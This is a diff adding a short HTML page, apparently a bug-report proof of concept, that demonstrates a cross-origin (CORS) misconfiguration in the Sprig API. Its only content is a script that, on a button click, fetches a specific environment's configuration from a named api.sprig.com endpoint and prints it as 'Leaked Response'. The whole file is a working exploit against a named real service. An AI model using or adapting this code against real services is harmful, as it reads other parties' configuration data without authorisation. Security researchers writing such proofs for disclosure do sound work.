@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>🧠 CORS PoC – Sprig API Config Leak</h1>
+    <button onclick="fetchLeak()">Run Exploit</button>
+    <pre id="out">Waiting...</pre>
+
+    <script>
+      function fetchLeak() {
+        fetch("https://api.sprig.com/sdk/1/environments/o1_Wnd5VKl/config")
+          .then(res => res.text())
+          .then(data => {
+            document.getElementById("out").textContent = "Leaked Response:\n\n" + data;
+          })
+          .catch(err => {
+            document.getElementById("out").textContent = "Fetch failed: " + err;
+          });
+      }
+    </script>
+  </body>
+</html>
